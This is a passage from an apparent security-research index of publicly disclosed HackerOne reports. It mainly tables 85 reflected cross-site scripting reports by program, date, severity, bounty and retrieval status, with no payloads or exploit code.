- STOR-111 (https://hackerone.com/reports/175122): Partial report (official disclosure summary only).
- STOR-113 (https://hackerone.com/reports/181823): Partial report (official disclosure summary only).
- STOR-114 (https://hackerone.com/reports/181955): Partial report (official disclosure summary only).
- STOR-115 (https://hackerone.com/reports/183971): Partial report (official disclosure summary only).
- STOR-116 (https://hackerone.com/reports/184901): Partial report (official disclosure summary only).
- STOR-118 (https://hackerone.com/reports/187759): Partial report (official disclosure summary only).
- STOR-124 (https://hackerone.com/reports/192922): Partial report (official disclosure summary only).
- STOR-128 (https://hackerone.com/reports/202496): Partial report (official disclosure summary only).
- STOR-131 (https://hackerone.com/reports/211643): Partial report (official disclosure summary only).
- STOR-137 (https://hackerone.com/reports/222838): Partial report (official disclosure summary only).
- STOR-142 (https://hackerone.com/reports/231389): Partial report (official disclosure summary only).
- STOR-143 (https://hackerone.com/reports/231444): Partial report (official disclosure summary only).
- STOR-145 (https://hackerone.com/reports/235292): Partial report (official disclosure summary only).
- STOR-154 (https://hackerone.com/reports/251043): Partial report (official disclosure summary only).

</details>

#### Reflected-XSS → [`Reflected-XSS.md`](../../Reflected-XSS.md)

85 sources. Weakness field as published by HackerOne:

- Cross-site Scripting (XSS) - Generic: 66
- Cross-site Scripting (XSS) - Reflected: 19

| Case ID | Original report title | Program | Published | Severity | Bounty | Weakness (H1) | Affected asset | Evidence | Playbook |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| REFL-001 | [Reflective XSS can be triggered in IE](https://hackerone.com/reports/2497) | Slack | 2014-02-28T00:00:00 | Not disclosed in the source | $150 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-002 | [XSS Reflected - https://www.stopthehacker.com/](https://hackerone.com/reports/9148) | StopTheHacker | 2014-04-22T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-003 | [Reflected XSS in Pastebin-view](https://hackerone.com/reports/17540) | IRCCloud | 2014-06-26T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-004 | [Vimeo.com - Reflected XSS Vulnerability](https://hackerone.com/reports/42582) | Vimeo | 2015-01-05T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-005 | [Vimeo.com - reflected xss vulnerability](https://hackerone.com/reports/42584) | Vimeo | 2015-01-05T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-006 | [Reflected xss in user name thru cookie](https://hackerone.com/reports/47341) | Mobile Vikings | 2015-02-10T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-007 | [Reflected XSS in chat](https://hackerone.com/reports/73566) | Shopify | 2015-07-01T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-008 | [Reflective Xss Vulnerability](https://hackerone.com/reports/80694) | Urban Dictionary | 2015-08-05T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-009 | [[now.informatica.com] Reflective Xss](https://hackerone.com/reports/81191) | Informatica | 2015-08-08T00:00:00 | high | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-010 | [apps.owncloud.com: Multiple reflected XSS by insecure URL generation (IE only)](https://hackerone.com/reports/83381) | ownCloud | 2015-08-19T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-011 | [Reflected XSS on vimeo.com/musicstore](https://hackerone.com/reports/85615) | Vimeo | 2015-08-30T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-012 | [Reflected XSS and/or malicious redirection via JWPlayer 6 configuration modification](https://hackerone.com/reports/95640) | Udemy | 2015-10-24T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-013 | [Cross-Site Scripting Reflected On Main Domain](https://hackerone.com/reports/104917) | Instacart | 2015-12-13T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-014 | [[now.informatica.com] Reflective XSS](https://hackerone.com/reports/106678) | Informatica | 2015-12-23T00:00:00 | high | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-015 | [otrs.owncloud.com: Reflected Cross-Site Scripting](https://hackerone.com/reports/108288) | ownCloud | 2016-01-05T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-016 | [Reflected Cross Site Script in www.gmcar.gm.com](https://hackerone.com/reports/116135) | General Motors | 2016-02-12T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-017 | [Reflected XSS on Uber.com careers](https://hackerone.com/reports/117190) | Uber | 2016-02-18T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-018 | [Reflected Cross Site Script in imtportal.gm.com](https://hackerone.com/reports/120622) | General Motors | 2016-03-04T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-019 | [Reflected Cross Site Script in m.chevrolet.com.wpsegment5.gm.com](https://hackerone.com/reports/120656) | General Motors | 2016-03-04T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-020 | [Reflected XSS on Zomato API](https://hackerone.com/reports/125762) | Zomato | 2016-03-24T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-021 | [Reflected XSS in owncloud.com](https://hackerone.com/reports/127259) | ownCloud | 2016-04-01T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-022 | [Reflected XSS and something more Store XSS too](https://hackerone.com/reports/134004) | General Motors | 2016-04-23T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-023 | [Reflected XSS via Livefyre Media Wall in newsroom.uber.com](https://hackerone.com/reports/134061) | Uber | 2016-04-23T00:00:00 | Not disclosed in the source | $2,000 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-024 | [Reflected cross-site scripting (XSS) on api.tiles.mapbox.com](https://hackerone.com/reports/135217) | Mapbox | 2016-04-28T00:00:00 | Not disclosed in the source | $1,000 | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-025 | [Reflected XSS in Backend search](https://hackerone.com/reports/136600) | Moneybird | 2016-05-05T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-026 | [Reflected XSS on business-blog.zomato.com - Part I](https://hackerone.com/reports/137905) | Zomato | 2016-05-11T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-027 | [Reflected XSS on business-blog.zomato.com - Part 2](https://hackerone.com/reports/137906) | Zomato | 2016-05-11T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-028 | [Reflected XSS in domain www.veris.in](https://hackerone.com/reports/137938) | Veris | 2016-05-11T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-029 | [Reflected Cross-Site Scripting in www.zomato.com/php/instagram_tag_relay](https://hackerone.com/reports/138262) | Zomato | 2016-05-12T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-030 | [www.starbucks.co.uk Reflected XSS via utm_source parameter](https://hackerone.com/reports/140616) | Starbucks | 2016-05-24T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | www.starbucks.co.uk | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-031 | [Reflected Xss in AirMax [Nanostation Loco M2]](https://hackerone.com/reports/149287) | Ubiquiti Networks | 2016-07-05T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-032 | [Reflected XSS via #tags= while using a callback in newswire http://www.rockstargames.com/newswire](https://hackerone.com/reports/153618) | Rockstar Games | 2016-07-25T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | *.rockstargames.com | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-033 | [Reflected XSS in Gallery App](https://hackerone.com/reports/165686) | Nextcloud | 2016-09-04T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-034 | [DOM based reflected XSS in rockstargames.com/newswire/tags through cross domain ajax request](https://hackerone.com/reports/172843) | Rockstar Games | 2016-09-29T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | *.rockstargames.com | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-035 | [Reflected Cross site scripting](https://hackerone.com/reports/174909) | Veris | 2016-10-10T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-036 | [[parc.informatica.com] Reflected Cross Site Scripting and Open Redirect](https://hackerone.com/reports/178278) | Informatica | 2016-10-26T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-037 | [Reflected Xss on](https://hackerone.com/reports/182033) | Pushwoosh | 2016-11-14T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-038 | [Reflected XSS vulnerability on a DoD website](https://hackerone.com/reports/183835) | U.S. Dept Of Defense | 2016-11-21T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-039 | [Reflected XSS on a DoD website](https://hackerone.com/reports/183844) | U.S. Dept Of Defense | 2016-11-21T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-040 | [Reflective XSS vulnerability on a DoD website](https://hackerone.com/reports/183854) | U.S. Dept Of Defense | 2016-11-21T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-041 | [Reflected XSS on a Department of Defense website](https://hackerone.com/reports/183855) | U.S. Dept Of Defense | 2016-11-21T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-042 | [Reflected XSS on a DoD website](https://hackerone.com/reports/183871) | U.S. Dept Of Defense | 2016-11-21T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-043 | [Reflected XSS on a Navy website](https://hackerone.com/reports/183878) | U.S. Dept Of Defense | 2016-11-21T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-044 | [Reflected cross-site scripting vulnerability on a DoD website](https://hackerone.com/reports/184042) | U.S. Dept Of Defense | 2016-11-22T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-045 | [Reflected XSS vulnerability on a DoD website](https://hackerone.com/reports/184125) | U.S. Dept Of Defense | 2016-11-22T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-046 | [Reflected XSS on an Army website](https://hackerone.com/reports/184199) | U.S. Dept Of Defense | 2016-11-22T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-047 | [Reflected XSS on a DoD website](https://hackerone.com/reports/184200) | U.S. Dept Of Defense | 2016-11-22T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-048 | [Reflected XSS on a Department of Defense website](https://hackerone.com/reports/184286) | U.S. Dept Of Defense | 2016-11-22T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-049 | [Reflected XSS on a DoD website](https://hackerone.com/reports/184750) | U.S. Dept Of Defense | 2016-11-24T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-050 | [Reflected XSS vulnerability on a DoD website](https://hackerone.com/reports/187822) | U.S. Dept Of Defense | 2016-12-02T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-051 | [Reflected XSS in a Navy website](https://hackerone.com/reports/188691) | U.S. Dept Of Defense | 2016-12-06T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-052 | [Reflected XSS on a DoD website](https://hackerone.com/reports/189241) | U.S. Dept Of Defense | 2016-12-07T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-053 | [Reflected XSS on a DoD website](https://hackerone.com/reports/190205) | U.S. Dept Of Defense | 2016-12-10T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-054 | [Reflected XSS vector](https://hackerone.com/reports/190247) | GoCD | 2016-12-11T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-055 | [Reflected XSS on a DoD website](https://hackerone.com/reports/190427) | U.S. Dept Of Defense | 2016-12-11T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-056 | [Reflected XSS on teavana.com (Locale-Change)](https://hackerone.com/reports/190798) | Starbucks | 2016-12-13T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-057 | [Reflected cross-site scripting (XSS) vulnerability on a DoD website](https://hackerone.com/reports/191381) | U.S. Dept Of Defense | 2016-12-15T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-058 | [Reflected XSS in U2F plugin by shipping the example endpoints](https://hackerone.com/reports/192786) | Nextcloud | 2016-12-20T00:00:00 | high | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-059 | [Reflected XSS on a DoD website](https://hackerone.com/reports/193481) | U.S. Dept Of Defense | 2016-12-22T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-060 | [Reflected XSS on a DoD website](https://hackerone.com/reports/194294) | U.S. Dept Of Defense | 2016-12-28T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-061 | [Open redirect / Reflected XSS payload in root that affects all your sites (store.starbucks.* / shop.starbucks.* / teavana.com)](https://hackerone.com/reports/196846) | Starbucks | 2017-01-09T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Other assets | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-062 | [Reflected XSS vulnerability on a DoD website](https://hackerone.com/reports/198259) | U.S. Dept Of Defense | 2017-01-14T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-063 | [Reflected XSS](https://hackerone.com/reports/203241) | Algolia | 2017-02-03T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-064 | [Reflected XSS vulnerability in a DoD website](https://hackerone.com/reports/207781) | U.S. Dept Of Defense | 2017-02-20T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Partial report (official disclosure summary only) | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-065 | [Reflected cross-site scripting (XSS) vulnerability in scores.ubnt.com allows attackers to inject arbitrary web script via p parameter.](https://hackerone.com/reports/208622) | Ubiquiti Networks | 2017-02-24T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-066 | [Reflected XSS in openapi.starbucks.com /searchasyoutype/v1/search?x-api-key=[REDACTED_SECRET] | Starbucks | 2017-03-13T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Generic | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-067 | [Stored passive XSS at scheduled posts (kitcrm.com)](https://hackerone.com/reports/214581) | Shopify | 2017-03-19T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Reflected | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-068 | [Reflected XSS in error pages (NC-SA-2017-008)](https://hackerone.com/reports/216812) | Nextcloud | 2017-03-28T00:00:00 | low | $450 | Cross-site Scripting (XSS) - Reflected | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-069 | [Reflected XSS in a DoD Website](https://hackerone.com/reports/217108) | U.S. Dept Of Defense | 2017-03-29T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Reflected | Not disclosed in the source | Partial report (official disclosure summary only) | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-070 | [Reflected XSS vulnerability on a DoD website](https://hackerone.com/reports/218136) | U.S. Dept Of Defense | 2017-04-02T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Reflected | Not disclosed in the source | Partial report (official disclosure summary only) | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-071 | [[Gnip Blogs] Reflected XSS via "plupload.flash.swf" component vulnerable to SOME](https://hackerone.com/reports/218451) | Twitter | 2017-04-04T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Reflected | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-072 | [XSS](https://hackerone.com/reports/219170) | Ubiquiti Networks | 2017-04-06T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Reflected | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-073 | [Reflected XSS on a DoD website](https://hackerone.com/reports/219729) | U.S. Dept Of Defense | 2017-04-09T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Reflected | Not disclosed in the source | Partial report (official disclosure summary only) | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-074 | [XSS in the search bar of mercantile.wordpress.org](https://hackerone.com/reports/221893) | WordPress | 2017-04-18T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Reflected | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-075 | [Reflected XSS at https://da.wordpress.org/themes/?s= via "s=" parameter](https://hackerone.com/reports/222040) | WordPress | 2017-04-18T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Reflected | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-076 | [Reflected XSS in <any>.myshopify.com through theme preview](https://hackerone.com/reports/226428) | Shopify | 2017-05-05T00:00:00 | Not disclosed in the source | Not disclosed in the source | Cross-site Scripting (XSS) - Reflected | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-077 | [Cross-site scripting (XSS) vulnerability on a DoD website](https://hackerone.com/reports/227643) | U.S. Dept Of Defense | 2017-05-11T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Reflected | Not disclosed in the source | Partial report (official disclosure summary only) | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-078 | [Reflected XSS in Zomato Mobile - category parameter](https://hackerone.com/reports/230119) | Zomato | 2017-05-20T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Reflected | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-079 | [[mercantile.wordpress.org] Reflected XSS via AngularJS Template Injection](https://hackerone.com/reports/230234) | WordPress | 2017-05-20T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Reflected | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-080 | [XSS on http://irc.parrotsec.org](https://hackerone.com/reports/238842) | Parrot Sec | 2017-06-10T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Reflected | Not disclosed in the source | Partial report (official disclosure summary only) | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-081 | [XSS in http://www.rockstargames.com/theballadofgaytony/js/jquery.base.js](https://hackerone.com/reports/242905) | Rockstar Games | 2017-06-24T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Reflected | *.rockstargames.com | Partial report (official disclosure summary only) | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-082 | [Reflected XSS via Double Encoding](https://hackerone.com/reports/246505) | Rockstar Games | 2017-07-06T00:00:00 | medium | $500 | Cross-site Scripting (XSS) - Reflected | support.rockstargames.com | Partial report (official disclosure summary only) | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-083 | [XSS Vulnerability in WooCommerce Product Vendors plugin](https://hackerone.com/reports/253313) | Automattic | 2017-07-25T00:00:00 | low | Not disclosed in the source | Cross-site Scripting (XSS) - Reflected | Not disclosed in the source | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-084 | [dom based xss in https://www.rockstargames.com/GTAOnline/](https://hackerone.com/reports/254343) | Rockstar Games | 2017-07-28T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Reflected | www.rockstargames.com | Partial report (official disclosure summary only) | [Reflected-XSS.md](../../Reflected-XSS.md) |
| REFL-085 | [Reflected XSS - gratipay.com](https://hackerone.com/reports/262852) | Gratipay | 2017-08-24T00:00:00 | medium | Not disclosed in the source | Cross-site Scripting (XSS) - Reflected | https://gratipay.com | Full report | [Reflected-XSS.md](../../Reflected-XSS.md) |

<details><summary>Retrieval limitations for this group</summary>

- REFL-010 (https://hackerone.com/reports/83381): Partial report (official disclosure summary only).
- REFL-016 (https://hackerone.com/reports/116135): Partial report (official disclosure summary only).
- REFL-018 (https://hackerone.com/reports/120622): Partial report (official disclosure summary only).
- REFL-019 (https://hackerone.com/reports/120656): Partial report (official disclosure summary only).
- REFL-022 (https://hackerone.com/reports/134004): Partial report (official disclosure summary only).
- REFL-035 (https://hackerone.com/reports/174909): Partial report (official disclosure summary only).
- REFL-038 (https://hackerone.com/reports/183835): Partial report (official disclosure summary only).
- REFL-039 (https://hackerone.com/reports/183844): Partial report (official disclosure summary only).
- REFL-040 (https://hackerone.com/reports/183854): Partial report (official disclosure summary only).
- REFL-041 (https://hackerone.com/reports/183855): Partial report (official disclosure summary only).
- REFL-042 (https://hackerone.com/reports/183871): Partial report (official disclosure summary only).
- REFL-043 (https://hackerone.com/reports/183878): Partial report (official disclosure summary only).
- REFL-044 (https://hackerone.com/reports/184042): Partial report (official disclosure summary only).
- REFL-045 (https://hackerone.com/reports/184125): Partial report (official disclosure summary only).
- REFL-046 (https://hackerone.com/reports/184199): Partial report (official disclosure summary only).
- REFL-047 (https://hackerone.com/reports/184200): Partial report (official disclosure summary only).
- REFL-048 (https://hackerone.com/reports/184286): Partial report (official disclosure summary only).
- REFL-049 (https://hackerone.com/reports/184750): Partial report (official disclosure summary only).
- REFL-050 (https://hackerone.com/reports/187822): Partial report (official disclosure summary only).
- REFL-051 (https://hackerone.com/reports/188691): Partial report (official disclosure summary only).
- REFL-052 (https://hackerone.com/reports/189241): Partial report (official disclosure summary only).
- REFL-053 (https://hackerone.com/reports/190205): Partial report (official disclosure summary only).
- REFL-055 (https://hackerone.com/reports/190427): Partial report (official disclosure summary only).
- REFL-057 (https://hackerone.com/reports/191381): Partial report (official disclosure summary only).
- REFL-059 (https://hackerone.com/reports/193481): Partial report (official disclosure summary only).
- REFL-060 (https://hackerone.com/reports/194294): Partial report (official disclosure summary only).
- REFL-062 (https://hackerone.com/reports/198259): Partial report (official disclosure summary only).
- REFL-063 (https://hackerone.com/reports/203241): Partial report (official disclosure summary only).
- REFL-064 (https://hackerone.com/reports/207781): Partial report (official disclosure summary only).
- REFL-069 (https://hackerone.com/reports/217108): Partial report (official disclosure summary only).
- REFL-070 (https://hackerone.com/reports/218136): Partial report (official disclosure summary only).
- REFL-073 (https://hackerone.com/reports/219729): Partial report (official disclosure summary only).
- REFL-077 (https://hackerone.com/reports/227643): Partial report (official disclosure summary only).
- REFL-080 (https://hackerone.com/reports/238842): Partial report (official disclosure summary only).
- REFL-081 (https://hackerone.com/reports/242905): Partial report (official disclosure summary only).
- REFL-082 (https://hackerone.com/reports/246505): Partial report (official disclosure summary only).
- REFL-084 (https://hackerone.com/reports/254343): Partial report (official disclosure summary only).

</details>

#### Filter-Bypass-and-Encoding → [`Filter-Bypass-and-Encoding.md`](../../Filter-Bypass-and-Encoding.md)

38 sources. Weakness field as published by HackerOne:

- Cross-site Scripting (XSS) - Generic: 38

